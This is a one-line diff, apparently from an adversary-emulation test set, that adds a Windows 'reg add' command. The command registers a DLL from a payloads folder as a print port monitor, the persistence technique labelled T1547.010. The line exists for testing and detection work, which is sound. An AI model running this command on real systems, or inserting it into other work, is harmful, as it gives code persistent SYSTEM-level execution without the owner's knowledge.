@@ -1,0 +1,1 @@
+reg add "hklm\system\currentcontrolset\control\print\monitors\ART" /v "Driver" /d "d:\src\payloads\T1547.010\PortMonitor.dll" /t REG_SZ /f
